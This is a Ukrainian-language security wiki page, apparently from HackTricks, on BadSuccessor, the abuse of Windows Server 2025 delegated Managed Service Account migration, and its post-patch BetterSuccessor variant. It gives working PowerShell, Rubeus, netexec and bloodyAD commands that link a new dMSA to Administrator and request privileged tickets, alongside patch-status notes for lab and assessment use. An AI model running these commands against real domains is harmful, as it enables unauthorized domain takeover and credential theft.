# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

**BadSuccessor** зловживає workflow міграції **delegated Managed Service Account** (**dMSA**), запровадженим у **Windows Server 2025**. dMSA можна пов’язати зі старим обліковим записом через **`msDS-ManagedAccountPrecededByLink`** і перевести між станами міграції, що зберігаються в **`msDS-DelegatedMSAState`**. Якщо зловмисник може створити dMSA в OU з правом запису та контролювати ці атрибути, KDC може видавати квитки для контрольованого зловмисником dMSA з **контекстом авторизації пов’язаного облікового запису**.<sup>[[2]](#references)</sup>

На практиці це означає, що користувач із низькими привілеями, який має лише делеговані права на OU, може створити новий dMSA, вказати для нього `Administrator`, завершити міграцію, а потім отримати TGT, PAC якого містить привілейовані групи, як-от **Domain Admins**.<sup>[[2]](#references)</sup>

## Важливі деталі міграції dMSA

- dMSA — це функція **Windows Server 2025**.
- `Start-ADServiceAccountMigration` переводить міграцію в стан **started**.
- `Complete-ADServiceAccountMigration` переводить міграцію в стан **completed**.
- `msDS-DelegatedMSAState = 1` означає, що міграцію розпочато.
- `msDS-DelegatedMSAState = 2` означає, що міграцію завершено.
- Під час легітимної міграції dMSA має прозоро замінити обліковий запис, який виводиться з експлуатації, тому KDC/LSA зберігають доступ, який уже мав попередній обліковий запис.<sup>[[3]](#references)</sup>

У Microsoft Learn також зазначено, що під час міграції початковий обліковий запис пов’язується з dMSA, а dMSA має отримати доступ до ресурсів, до яких мав доступ старий обліковий запис.<sup>[[3]](#references)</sup> Саме цим припущенням щодо безпеки зловживає BadSuccessor.<sup>[[2]](#references)</sup>

## Вимоги

1. Домен, у якому **є dMSA**, тобто на стороні AD підтримується **Windows Server 2025**.
2. Зловмисник може **створювати** об’єкти `msDS-DelegatedManagedServiceAccount` у певному OU або має еквівалентні широкі права на створення дочірніх об’єктів у цьому OU.
3. Зловмисник може **змінювати** відповідні атрибути dMSA або повністю контролює щойно створений dMSA.
4. Зловмисник може запитувати квитки Kerberos із контексту приєднаної до домену системи або через тунель, що забезпечує доступ до LDAP/Kerberos.<sup>[[2]](#references)</sup>

### Практичні перевірки

Найпростіший спосіб для оператора — перевірити рівень домену/лісу та підтвердити, що середовище вже використовує новий стек Server 2025:

```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```

Якщо ви бачите такі значення, як `Windows2025Domain` і `Windows2025Forest`, пріоритетно перевірте **BadSuccessor / dMSA migration abuse**.

Також можна перелічити доступні для запису OU, делеговані для створення dMSA, за допомогою загальнодоступних інструментів:<sup>[[1]](#references)</sup>

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```

## Потік зловживання

1. Створіть dMSA в OU, де вам делеговано право створювати дочірні об’єкти.
2. Встановіть **`msDS-ManagedAccountPrecededByLink`** на DN привілейованої цілі, наприклад `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Встановіть **`msDS-DelegatedMSAState`** на `2`, щоб позначити міграцію як завершену.
4. Запросіть TGT для нового dMSA та використайте отриманий квиток для доступу до привілейованих служб.<sup>[[2]](#references)</sup>

Приклад PowerShell:<sup>[[2]](#references)</sup>

```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
    msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Приклади запиту квитка / операційних інструментів:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```

## Чому це більше, ніж підвищення привілеїв

Під час легітимної міграції Windows також потрібно, щоб новий dMSA обробляв квитки, видані для попереднього облікового запису до переключення. Саме тому матеріали квитків, пов’язані з dMSA, можуть містити **поточні** та **попередні** ключі в потоці **`KERB-DMSA-KEY-PACKAGE`**.<sup>[[2]](#references)</sup>

Для фальшивої міграції, контрольованої зловмисником, така поведінка може перетворити BadSuccessor на:<sup>[[2]](#references)</sup>

- **Підвищення привілеїв** через успадкування SID привілейованих груп у PAC.
- **Розкриття матеріалів облікових даних**, оскільки обробка попередніх ключів у вразливих сценаріях може розкрити матеріал, еквівалентний RC4/NT-хешу попереднього облікового запису.

Це робить техніку корисною як для безпосереднього захоплення домену, так і для подальших операцій, як-от pass-the-hash або ширшої компрометації облікових даних.

## BetterSuccessor після патча KDC

KDC із патчем перевіряє обидві сторони міграції dMSA. Окрім `msDS-ManagedAccountPrecededByLink` і стану міграції dMSA, попередній обліковий запис має вказувати назад на dMSA через `msDS-SupersededManagedAccountLink` і мати сумісний `msDS-SupersededServiceAccountState`. Одностороннє посилання тепер не спрацьовує; обліковий запис, який може лише створювати dMSA, не може вказати будь-який довільний попередній обліковий запис. Якщо зловмисник має `CreateChild` для dMSA в OU **і** ефективний доступ на запис до атрибутів міграції вибраного цільового облікового запису, він може встановити взаємне посилання. Квиток отриманого dMSA може містити контекст авторизації попереднього облікового запису та розкрити його ключі в пакеті ключів dMSA. Це цільовий шлях доступу до облікових даних і розширення привілеїв, а не доказ того, що початковий BadSuccessor із довільною ціллю досі експлуатується на DC із патчами.<sup>[[5]](#references)[[6]](#references)</sup>

У лабораторному середовищі, де підтверджено доступ на запис до цільового облікового запису, `bloodyAD` може створити dMSA та виконати парні записи атрибутів міграції. Запросіть квиток dMSA, використавши отримані матеріали Kerberos, і перевірте фактичні дозволи цільового облікового запису, перш ніж вважати, що його привілеї або хеш було отримано. Назва підкоманди інструмента `badSuccessor` не означає, що вона використовує непатчену односторонню поведінку.<sup>[[7]](#references)</sup>

```bash
KRB5CCNAME=operator.ccache bloodyAD -d example.local --host dc.example.local -k add badSuccessor test_dmsa --ou 'OU=DMSAHolder,DC=example,DC=local' -t 'CN=Target User,OU=Users,DC=example,DC=local'
```

## Нотатки щодо статусу виправлення

Початкова поведінка BadSuccessor — це **не просто теоретична проблема попередньої версії 2025 року**. Microsoft присвоїла їй **CVE-2025-53779** і випустила оновлення безпеки в **серпні 2025 року**.<sup>[[4]](#references)</sup> Зберігайте опис цієї атаки для:

- **labs / CTFs / assume-breach вправ**
- **середовищ Windows Server 2025 без виправлень**
- **перевірки делегування OU та наявності dMSA під час оцінювань**

Не вважайте домен Windows Server 2025 вразливим лише через наявність dMSA; перевірте рівень встановлених виправлень і ретельно протестуйте.

## Інструменти

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - BadSuccessor dMSA abuse to Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
- [5] [Akamai - BadSuccessor Is Dead, Long Live BadSuccessor(?)](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch)
- [6] [Altered Security - BetterSuccessor: Still abusing dMSA after the patch](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch)
- [7] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)

{{#include ../../../banners/hacktricks-training.md}}
